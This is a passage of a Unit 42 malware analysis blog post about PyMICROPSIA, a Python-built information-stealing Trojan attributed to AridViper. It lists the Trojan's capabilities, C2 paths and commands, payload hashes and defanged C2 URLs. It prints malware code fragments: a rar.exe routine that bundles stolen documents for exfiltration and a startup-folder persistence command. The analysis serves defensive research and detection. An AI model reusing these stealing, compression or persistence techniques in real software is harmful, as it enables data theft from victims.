<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">PyMICROPSIA: New Information-Stealing Trojan from AridViper</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-110155 entry-meta">
				
				
				<span class="post-views-count">4,137</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'110155','like')"><i class="ui ui-2"></i><span class="ml-5">3</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 17</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Fpymicropsia%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Fpymicropsia%2F+-+PyMICROPSIA%3A+New+Information-Stealing+Trojan+from+AridViper" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fpymicropsia%2F&title=PyMICROPSIA%3A+New+Information-Stealing+Trojan+from+AridViper&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/pymicropsia/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/unit42/" title="Posts by Unit 42" class="author url fn" rel="author">Unit 42</a>        </p>
        <p><time datetime="2020-12-14T14:00:03+00:00">December 14, 2020 at 6:00 AM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit-42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/aridviper/" rel="tag">AridViper</a>, <a href="https://unit42.paloaltonetworks.com/tag/information-stealer/" rel="tag">information stealer</a>, <a href="https://unit42.paloaltonetworks.com/tag/malware/" rel="tag">malware</a>, <a href="https://unit42.paloaltonetworks.com/tag/micropsia/" rel="tag">MICROPSIA</a>, <a href="https://unit42.paloaltonetworks.com/tag/trojan/" rel="tag">Trojan</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                      <figure class="mb-30 text-center">
              <img width="900" height="450" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/Malware-r3d1.png" class="attachment-single size-single" alt="Conceptual image illustrating the concept of malware, such as PyMICROPSIA, the malware family discussed here" />            </figure>
                    <h2><a id="post-110155-_m3vu58otj9fb"></a>Executive Summary</h2>
<p>Unit 42 researchers have been tracking the threat group AridViper, which has been targeting the Middle Eastern region. As part of this research, a new information-stealing Trojan with relations to the <a href="https://unit42.paloaltonetworks.com/unit42-targeted-attacks-middle-east-using-kasperagent-micropsia/#:~:text=We%20named%20the%20second%20new,malicious%20updates%20a%20secure%20updates.">MICROPSIA</a> malware family has been identified, showing that the actor maintains a very active development profile, creating new implants that seek to bypass the defenses of their targets. We have named this new malware family PyMICROPSIA because it is built with Python.</p>
<p>Figure 1 below provides a high-level overview of the capabilities of the PyMICROPSIA malware family and similarities observed with previous AridViper activity. While investigating PyMICROPSIA capabilities, we identified two additional samples hosted in the attacker’s infrastructure, which are downloaded and used by PyMICROPSIA during its deployment. The additional samples provide persistence and keylogging capabilities, which we discuss later.</p>
<figure id="attachment_110158" aria-describedby="caption-attachment-110158" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110158" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-182.png" alt="Main features of PyMICROPSIA include file uploading, payload drop and execution, browser credential stealing, screenshots, keylogging, collect local machine information, manage and exfiltrate files, collect Outlook information, audio recording and command execution. " width="900" height="719" /><figcaption id="caption-attachment-110158" class="wp-caption-text">Figure 1. PyMICROPSIA overview.</figcaption></figure>
<p>In this blog, we will detail the functionality and objectives of PyMICROPSIA and analyze its command and control (C2) implementation. We will also highlight the main observations that allow us to attribute PyMICROPSIA to previous AridViper activity.</p>
<p>Palo Alto Networks <a href="https://www.paloaltonetworks.com/network-security/next-generation-firewall">Next-Generation Firewall</a> customers are protected from the attacks outlined in this blog with <a href="https://www.paloaltonetworks.com/products/secure-the-network/wildfire">WildFire</a>, <a href="https://www.paloaltonetworks.com/products/threat-detection-and-prevention/web-security">URL Filtering</a> and <a href="https://www.paloaltonetworks.com/products/threat-detection-and-prevention/dns-security">DNS Security</a> subscriptions. Customers are also protected with <a href="https://www.paloaltonetworks.com/cortex/autofocus">AutoFocus</a> and <a href="https://www.paloaltonetworks.com/cortex/cortex-xdr">Cortex XDR</a>.</p>
<h2><a id="post-110155-_z722f2g6p59l"></a>PyMICROPSIA Analysis</h2>
<p>PyMICROPSIA has a rich set of information-stealing and control capabilities, including:</p>
<ul>
<li>File uploading.</li>
<li>Payload downloading and execution.</li>
<li>Browser credential stealing. Clearing browsing history and profiles.</li>
<li>Taking screenshots.</li>
<li>Keylogging.</li>
<li>Compressing RAR files for stolen information.</li>
<li>Collecting process information and killing processes.</li>
<li>Collecting file listing information.</li>
<li>Deleting files.</li>
<li>Rebooting machine.</li>
<li>Collecting Outlook .ost file. Killing and disabling Outlook process.</li>
<li>Deleting, creating, compressing and exfiltrating files and folders.</li>
<li>Collecting information from USB drives, including file exfiltration.</li>
<li>Audio recording.</li>
<li>Executing commands.</li>
</ul>
<h4><a id="post-110155-_kapozwfibj8m"></a><strong>Implementation Overview</strong></h4>
<p>PyMICROPSIA is an information-stealing Trojan built with Python and made into a Windows executable using <a href="https://www.pyinstaller.org/">PyInstaller</a>.</p>
<figure id="attachment_110160" aria-describedby="caption-attachment-110160" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110160" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-183.png" alt="PyMICROPSIA is an information-stealing Trojan built with Python and made into a Windows executable using PyInstaller. " width="900" height="520" /><figcaption id="caption-attachment-110160" class="wp-caption-text">Figure 2. PyInstaller strings in PyMICROPSIA.</figcaption></figure>
<p>It implements its main functionality by running a loop, where it initializes different threads and calls several tasks periodically with the intent of collecting information and interacting with the C2 operator.</p>
<figure id="attachment_110162" aria-describedby="caption-attachment-110162" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110162" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-184.png" alt="PyMICROPSIA implements its main functionality by running a loop as shown here, where it initializes different threads and calls several tasks periodically with the intent of collecting information and interacting with the C2 operator. " width="900" height="1348" /><figcaption id="caption-attachment-110162" class="wp-caption-text">Figure 3. Main code loop.</figcaption></figure>
<p>The actor makes use of several interesting Python libraries to achieve its purposes, including both built-in Python libraries and specific packages. Some examples of information-stealing specific libraries are:</p>
<ul>
<li><a href="https://pypi.org/project/PyAudio/">PyAudio</a>, for audio stealing capabilities.</li>
<li><a href="https://pypi.org/project/mss/">mss</a>, for screenshot capabilities.</li>
</ul>
<figure id="attachment_110164" aria-describedby="caption-attachment-110164" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110164" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-185.png" alt="PyMICROPSIA uses the PyAudio library, as shown here, for audio stealing capabilities. " width="900" height="371" /><figcaption id="caption-attachment-110164" class="wp-caption-text">Figure 4. PyAudio library for audio recording.</figcaption></figure>
<figure id="attachment_110166" aria-describedby="caption-attachment-110166" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110166" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-186.png" alt="PyMICROPSIA uses the mss library, as shown here, for taking screenshots. " width="900" height="508" /><figcaption id="caption-attachment-110166" class="wp-caption-text">Figure 5. mss library for screenshots.</figcaption></figure>
<p>The usage of Python built-in libraries is expected for multiple purposes, such as interacting with Windows <a href="https://docs.python.org/3/library/subprocess.html">processes</a>, <a href="https://docs.python.org/3/library/winreg.html">Windows registry</a>, networking, file system and so on.</p>
<figure id="attachment_110168" aria-describedby="caption-attachment-110168" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110168" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-187.png" alt="The usage of Python built-in libraries is expected for Windows Registry interaction, as shown here. " width="900" height="483" /><figcaption id="caption-attachment-110168" class="wp-caption-text">Figure 6. Windows Registry interaction.</figcaption></figure>
<figure id="attachment_110170" aria-describedby="caption-attachment-110170" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110170" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-188.png" alt="The usage of Python built-in libraries is expected for Windows processes interaction, as shown here. " width="900" height="139" /><figcaption id="caption-attachment-110170" class="wp-caption-text">Figure 7. Windows processes interaction.</figcaption></figure>
<p>For more specific interactions with the Windows operating system, it makes use of libraries such as:</p>
<ul>
<li><a href="https://pypi.org/project/WMI/">WMI</a>, for interaction with Windows Management Instrumentation.</li>
<li><a href="http://timgolden.me.uk/pywin32-docs/win32security.html">win32security</a> and <a href="https://github.com/saltstack/salt-windows-install/blob/master/deps/salt/python/App/Lib/site-packages/win32/lib/ntsecuritycon.py">ntsecuritycon</a>, for interaction with the win32security API.</li>
</ul>
<figure id="attachment_110172" aria-describedby="caption-attachment-110172" style="width: 894px" class="wp-caption aligncenter"><img class="wp-image-110172" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-189.png" alt="PyMICROPSIA makes use of the WMI library for interaction with Windows Management Instrumentation." width="894" height="586" /><figcaption id="caption-attachment-110172" class="wp-caption-text">Figure 8. WMI usage for USB interaction.</figcaption></figure>
<figure id="attachment_110174" aria-describedby="caption-attachment-110174" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110174" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-190.png" alt="PyMICROPSIA makes use of the win32security and ntsecuritycon libraries for interaction with the win32security API. " width="900" height="346" /><figcaption id="caption-attachment-110174" class="wp-caption-text">Figure 9. win32security and ntsecuritycon usage.</figcaption></figure>
<p>An in-depth analysis of the code and capabilities of PyMICROPSIA can be found in the Appendix.</p>
<h4><a id="post-110155-_3rzzcpdn45u"></a><strong>Command and Control</strong></h4>
<p>PyMICROPSIA implements a simple HTTP POST-based C2 protocol, using different Uniform Resource Identifier (URI) paths and variables during the communication depending on the functionality invoked (full details on the implementation can be found in the Appendix).</p>
<p>The following table summarizes the URI paths and corresponding functionality in PyMICROPSIA:</p>
<table style="width: 101.717%;">
<tbody>
<tr>
<td style="width: 53.1111%;"><strong>Path</strong></td>
<td style="width: 306.889%;"><strong>Method</strong></td>
</tr>
<tr>
<td style="width: 53.1111%;">/zoailloaze/sfuxmiibif/samantha</td>
<td style="width: 306.889%;">Delete request. Unregister.</td>
</tr>
<tr>
<td style="width: 53.1111%;">/zoailloaze/sfuxmiibif/lashawna</td>
<td style="width: 306.889%;">Device registration.</td>
</tr>
<tr>
<td style="width: 53.1111%;">/zoailloaze/sfuxmiibif/matheny</td>
<td style="width: 306.889%;">Send command output data.</td>
</tr>
<tr>
<td style="width: 53.1111%;">/zoailloaze/sfuxmiibif/uiasfvz</td>
<td style="width: 306.889%;">USB device information</td>
</tr>
<tr>
<td style="width: 53.1111%;">/zoailloaze/sfuxmiibif/daryl</td>
<td style="width: 306.889%;">Delete request.</td>
</tr>
<tr>
<td style="width: 53.1111%;">/zoailloaze/sfuxmiibif/qprbudls</td>
<td style="width: 306.889%;">Download payload.</td>
</tr>
<tr>
<td style="width: 53.1111%;">/zoailloaze/sfuxmiibif/nyrvoz</td>
<td style="width: 306.889%;">Download URL.</td>
</tr>
<tr>
<td style="width: 53.1111%;">/zoailloaze/sfuxmiibif/hortense1</td>
<td style="width: 306.889%;">Upload file.</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><a id="post-110155-_an27zc1919zt"></a><span style="font-size: 12pt;"><sup><em><span style="color: #999999;">Table 1. Main purpose of configuration folders and files.</span> </em></sup></span></p>
<p>It&#8217;s also important to note that in the PyMICROPSIA samples analyzed, the C2-related code shows several code branches that will never be executed when responses are processed, likely because the actor is still actively working on the code. Based on the code sections that are reachable, the following table summarizes the commands and actions performed on the victim machine:</p>
<table style="width: 100.762%;">
<tbody>
<tr>
<td style="width: 14.73%;"><strong>Command</strong></td>
<td style="width: 251.555%;"><strong>Action</strong></td>
</tr>
<tr>
<td style="width: 14.73%;">Lee</td>
<td style="width: 251.555%;">Register new device.</td>
</tr>
<tr>
<td style="width: 14.73%;">Renee</td>
<td style="width: 251.555%;">Delete device.</td>
</tr>
<tr>
<td style="width: 14.73%;">Rapunzel</td>
<td style="width: 251.555%;">Steal and upload browser credentials to C2.</td>
</tr>
<tr>
<td style="width: 14.73%;">Mulan</td>
<td style="width: 251.555%;">Collect and upload process list.</td>
</tr>
<tr>
<td style="width: 14.73%;">Silverman</td>
<td style="width: 251.555%;">Collect and upload file information in TXT format.</td>
</tr>
<tr>
<td style="width: 14.73%;">Eeyore</td>
<td style="width: 251.555%;">Delete Firefox profiles and de-register device.</td>
</tr>
<tr>
<td style="width: 14.73%;">Pocahontas</td>
<td style="width: 251.555%;">Collect and upload compressed file information in JSON detailed format.</td>
</tr>
<tr>
<td style="width: 14.73%;">InfoCinder</td>
<td style="width: 251.555%;">Collect and upload information regarding drives in the system.</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 12pt;"><sup><span style="color: #999999;"><em>Table 2. Reachable C2 commands and actions.</em></span></sup></span></p>
<h4><a id="post-110155-_lcob9k2tgl7h"></a><strong>Is AridViper Working on New Attack Vectors?</strong></h4>
<p>PyMICROPSIA is designed to target Windows operating systems only, but the code contains interesting snippets checking for other operating systems, such as “posix” or “darwin”. This is an interesting finding, as we have not witnessed AridViper targeting these operating systems before and this could represent a new area the actor is starting to explore.</p>
<p><span style="font-family: 'courier new', courier, monospace;">[begin code]<br />
</span><span style="font-family: 'courier new', courier, monospace;">     else:<br />
</span><span style="font-family: 'courier new', courier, monospace;">         if os.name == <strong>&#8216;posix&#8217;</strong> and sys.platform == <strong>&#8216;darwin&#8217;</strong>:<br />
</span><span style="font-family: 'courier new', courier, monospace;">             PathName = os.getenv(&#8216;HOME&#8217;) + &#8216;/Library/Application Support/Google/Chrome/Default/&#8217;<br />
</span><span style="font-family: 'courier new', courier, monospace;">             if os.path.isdir(PathName) == False:<br />
</span><span style="font-family: 'courier new', courier, monospace;">                 sys.exit(0)<br />
</span><span style="font-family: 'courier new', courier, monospace;">         elif os.name == &#8216;posix&#8217;:<br />
</span><span style="font-family: 'courier new', courier, monospace;">             PathName = os.getenv(&#8216;HOME&#8217;) + &#8216;/.config/google-chrome/Default/&#8217;<br />
</span><span style="font-family: 'courier new', courier, monospace;">             if os.path.isdir(PathName) == False:<br />
</span><span style="font-family: 'courier new', courier, monospace;">                 sys.exit(0)<br />
</span><span style="font-family: 'courier new', courier, monospace;">     return PathName<br />
</span><span style="font-family: 'courier new', courier, monospace;">[end code]</span></p>
<p>For now, the code found is very simple, and could be part of a copy and paste effort when building the Python code, but in any case, we plan to keep it on our radar while researching new activity.</p>
<h4><a id="post-110155-_69nrgng9j98f"></a><strong>Additional Payloads</strong></h4>
<p>During the C2 interactions, PyMICROPSIA downloads two additional samples that are dropped and executed on the victim’s system, running additional functionality. These payloads are not Python / PyInstaller based.</p>
<h6><a id="post-110155-_4kcz001pdig0"></a><strong>KeyLogger functionality</strong></h6>
<p>This is a very interesting case, as the keylogging functionality hasn’t been implemented natively as part of PyMICROPSIA. Instead, the sample downloads a specific payload (see the section on File Download Capabilities in the Appendix for details on how the payload is downloaded).</p>
<p>The payload is downloaded with filename “MetroIntelGenericUIFram.exe” and has the following SHA-256:</p>
<p><span style="font-family: 'courier new', courier, monospace;">381b1efca980dd744cb8d36ad44783a35d01a321593a4f39a0cdae9c7eeac52f</span></p>
<p>The sample implements keylogging capabilities using the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate">GetAsyncKeyState</a> API method:</p>
<figure id="attachment_110176" aria-describedby="caption-attachment-110176" style="width: 830px" class="wp-caption aligncenter"><img class="wp-image-110176" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-191.png" alt="The sample of PyMICROPSIA doesn't implement keylogging functionality natively. Rather, it implements these capabilities using the GetAsyncKeyState API method. " width="830" height="1200" /><figcaption id="caption-attachment-110176" class="wp-caption-text">Figure 10. Keylogger GetAsyncKey() code.</figcaption></figure>
<p>It has a hardcoded configuration directly related to the directory structure initialized by the main PyMICROPSIA sample, so it needs to be compiled according to it. It needs to run under a specific directory created by PyMICROPSIA (“ModelsControllerLibb”), and will store keystroke information under the “HPFusionManagerDell” folder.</p>
<figure id="attachment_110178" aria-describedby="caption-attachment-110178" style="width: 874px" class="wp-caption aligncenter"><img class="wp-image-110178" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-192.png" alt="Hardcoded configuration parameters include the HPFusionManagerDell folder, where keystroke information is stored. " width="874" height="116" /><figcaption id="caption-attachment-110178" class="wp-caption-text">Figure 11. Hardcoded configuration parameters.</figcaption></figure>
<p>The keylogger drops information into the HPFusionManagerDell directory with the following filename structure and format:</p>
<figure id="attachment_110180" aria-describedby="caption-attachment-110180" style="width: 788px" class="wp-caption aligncenter"><img class="wp-image-110180" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-193.png" alt="The keylogger drops information into the HPFusionManagerDell directory with the filename structure shown here. " width="788" height="178" /><figcaption id="caption-attachment-110180" class="wp-caption-text">Figure 12. Keylogger output file format.</figcaption></figure>
<figure id="attachment_110182" aria-describedby="caption-attachment-110182" style="width: 628px" class="wp-caption aligncenter"><img class="wp-image-110182" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-194.png" alt="The keylogger drops information into the HPFusionManagerDell directory with the format shown here." width="628" height="364" /><figcaption id="caption-attachment-110182" class="wp-caption-text">Figure 13. Keylogger file content structure.</figcaption></figure>
<h5><a id="post-110155-_l9jnddvqpaa6"></a><strong>Persistence</strong></h5>
<p>Persistence in this malware sample can be achieved via regular methods, such as setting up registry keys, which is done as part of the Python code as follows:</p>
<figure id="attachment_110184" aria-describedby="caption-attachment-110184" style="width: 900px" class="wp-caption aligncenter"><img class="wp-image-110184" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/12/word-image-195.png" alt="Persistence in this malware sample can be achieved by setting up registry keys, which is done as part of the Python code shown here. " width="900" height="189" /><figcaption id="caption-attachment-110184" class="wp-caption-text">Figure 14. Registry key persistence.</figcaption></figure>
<p>However, there is something interesting about persistence in this implementation. The sample downloads another payload from the C2 server (see the File Download Capabilities section for more details). This payload is named “SynLocSynMomentum.exe”, with the following SHA-256:</p>
<p><span style="font-family: 'courier new', courier, monospace;">9c32fdf5af8b86049abd92561b3d281cb9aebf57d2dfef8cc2da59df82dca753</span></p>
<p>The sample is executed with specific parameters:</p>
<p><span style="font-family: 'courier new', courier, monospace;">SynLocSynMomentum.exe ModelsControllerLibb ModelsControllerLib</span></p>
<p>It sets up persistence via the shortcut .lnk copied to the startup menu. It&#8217;s striking that this code is run as a separate payload considering the amount of functionality already present in the Python code.</p>
<p><span style="font-family: 'courier new', courier, monospace;">&#8220;C:\Windows\System32\cmd.exe&#8221; /c move<br />
&#8220;C:\Users\admin\AppData\Local\Temp\\ModelsControllerLib.lnk&#8221;<br />
&#8220;C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start<br />
Menu\Programs\Startup\ModelsControllerLib.lnk&#8221;</span></p>
<h2><a id="post-110155-_fwoxqndd7dkm"></a>Relations With Other MICROPSIA Activity</h2>
<p>We unearthed PyMICROPSIA while investigating recent MICROPSIA activity related to the Middle Eastern region, and there are multiple aspects of the malware that link the activity to AridViper, including the following examples.</p>
<h4><a id="post-110155-_5ffsl8ga4j13"></a><strong>Code Overlaps</strong></h4>
<p>One of the first things that caught our attention regarding this sample was the C2 implementation and capabilities, which are quite similar to known MICROPSIA samples. For example, see the C2 descriptions in previous research by <a href="https://blog.radware.com/security/2018/07/micropsia-malware/">Radware</a> and <a href="https://research.checkpoint.com/2018/apt-attack-middle-east-big-bang/">Check Point</a>.</p>
<p>Also, one of the tactics, techniques and procedures (TTPs) observed across MICROPSIA samples is the use of rar.exe to compress data for exfiltration. In this version, rar.exe is downloaded from the C2 infrastructure and used with very similar parameters as observed in previous samples:</p>
<p><span style="font-family: 'courier new', courier, monospace;">[begincode]<br />
</span><span style="font-family: 'courier new', courier, monospace;">k24 = &#8216;&#8221;&#8216; + Wv + &#8216;\\*.dot&#8217; + &#8216;&#8221; &#8216;<br />
</span><span style="font-family: 'courier new', courier, monospace;">k25 = &#8216;&#8221;&#8216; + Wv + &#8216;\\*.dotx&#8217; + &#8216;&#8221; &#8216;<br />
</span><span style="font-family: 'courier new', courier, monospace;">AllFile = k1 + k2 + k3 + k4 + k5 + k6 + k7 + k8 + k9 + k11 + k12 + k13 + k14 + k15 + k16 + k17 + k18 + k19 + k20 + k21 + k22 + k23 + k24 + k25<br />
</span><span style="font-family: 'courier new', courier, monospace;">AllFiles_Drvi = AllFile<br />
</span><span style="font-family: 'courier new', courier, monospace;">flTDType = AllFiles_Drvi<br />
</span><span style="font-family: 'courier new', courier, monospace;">te = file_D<br />
</span><span style="font-family: 'courier new', courier, monospace;"><strong>En_crpypt2 = &#8216;a -r -ep1 -v2.5m -ta&#8217; + te + &#8216; -hp&#8217;<br />
</strong></span><span style="font-family: 'courier new', courier, monospace;">En = &#8216;4545933464930447517744759&#8217;<br />
</span><span style="font-family: 'courier new', courier, monospace;">mm = chick_Device_Name() + En<br />
</span><span style="font-family: 'courier new', courier, monospace;">nnWithoutdel = En_crpypt2 + mm<br />
</span><span style="font-family: 'courier new', courier, monospace;">subprocess.call(&#8216;&#8221;&#8216; + Rar_File + &#8216;&#8221;&#8216; + &#8216; &#8216; + (nnWithoutdel + &#8216; &#8216; + &#8216;&#8221;&#8216; + Zip_File2 + &#8216;_NETWORKWTHDate&#8221;&#8216; + &#8216; &#8216; + flTDType), shell=True)<br />
</span><span style="font-family: 'courier new', courier, monospace;">[end code]</span></p>
<p><span style="font-family: georgia, palatino, serif;">For example, see how one recent sample of MICROPSIA makes use of rar.exe.</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">SHA-256: 3c8979740d2f634ff2c0c0ab7adb78fe69d6d42307118d0bb934f03974deddac<br />
</span><span style="font-family: 'courier new', courier, monospace;">[begin code]<br />
&#8220;C:\Program Files\WinRAR\Rar.exe&#8221; a -r -ep1 -v2500k -hpcec6b597e046386f74b807c60ada61a5_d01247a1eaf1c24ffbc851e883e67f9b -ta2020-10-21 &#8220;C:\ProgramData\commonlogfiles\LMth_C&#8221; &#8220;C:\Users\admin\*.xls&#8221; &#8220;C:\Users\admin\*.xlsx&#8221; &#8220;C:\Users\admin\*.doc&#8221; &#8220;C:\Users\admin\*.docx&#8221; &#8220;C:\Users\admin\*.csv&#8221; &#8220;C:\Users\admin\*.pdf&#8221; &#8220;C:\Users\admin\*.ppt&#8221; &#8220;C:\Users\admin\*.pptx&#8221; &#8220;C:\Users\admin\*.odt&#8221; &#8220;C:\Users\admin\*.mdb&#8221; &#8220;C:\Users\admin\*.accdb&#8221; &#8220;C:\Users\admin\*.accde&#8221; &#8220;C:\Users\admin\*.txt&#8221; &#8220;C:\Users\admin\*.rtf&#8221;<br />
</span>[end code]</p>
<h4><a id="post-110155-_z513yjiq239f"></a><strong>C2 Communication Similarity</strong></h4>
<p>The URI path structures observed in multiple MICROPSIA samples follow a similar structure to the ones in the PyMICROPSIA samples. For example, if we look into the same recent MICROPSIA sample, we can observe the random characters and structure of the URI paths.</p>
<p><span style="font-family: 'courier new', courier, monospace;">SHA-256:<br />
</span><span style="font-family: 'courier new', courier, monospace;">3c8979740d2f634ff2c0c0ab7adb78fe69d6d42307118d0bb934f03974deddac</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">hxxps://jaime-martinez[.]info/sujqbrgpb/bztjpskd/rxkwjt<br />
</span><span style="font-family: 'courier new', courier, monospace;">hxxps://jaime-martinez[.]info/sujqbrgpb/bztjpskd/zxfsyadoss/gM69sY<br />
</span><span style="font-family: 'courier new', courier, monospace;">hxxp://jaime-martinez[.]info/sujqbrgpb/bztjpskd/tpmpyyzwg<br />
</span><span style="font-family: 'courier new', courier, monospace;">hxxps://jaime-martinez[.]info/sujqbrgpb/bztjpskd/ouwmhf/ImoOEJ<br />
</span><span style="font-family: 'courier new', courier, monospace;">hxxp://jaime-martinez[.]info/sujqbrgpb/bztjpskd/ouwmhf/voT8FY<br />
</span><span style="font-family: 'courier new', courier, monospace;">hxxp://jaime-martinez[.]info/sujqbrgpb/bztjpskd/rxkwjt<br />
</span><span style="font-family: 'courier new', courier, monospace;">hxxp://jaime-martinez[.]info/sujqbrgpb/bztjpskd/zxfsyadoss/TocLI5<br />
</span><span style="font-family: 'courier new', courier, monospace;">hxxps://jaime-martinez[.]info/sujqbrgpb/bztjpskd/ouwmhf/9WnKfe<br />
</span><span style="font-family: 'courier new', courier, monospace;">hxxp://jaime-martinez[.]info/sujqbrgpb/bztjpskd/zxfsyadoss/pyPaqj<br />
</span><span style="font-family: 'courier new', courier, monospace;">hxxps://jaime-martinez[.]info/sujqbrgpb/bztjpskd/ouwmhf/HRabCX</span></p>
<h4><a id="post-110155-_mcz0ybnoz79a"></a><strong>Themes Used</strong></h4>
<p>In the past, we have seen references in MICROPSIA to specific themes when it comes to code and C2 implementation, such as <a href="https://research.checkpoint.com/2018/apt-attack-middle-east-big-bang/">The Big Bang Theory</a> or <a href="https://blog.talosintelligence.com/2017/06/palestine-delphi.html">Game of Thrones</a>, and this new implementation is not different, including multiple references to multiple famous actor names, both in code variables as well as in infrastructure used, as can be seen in Figures 15 and 16.</p>
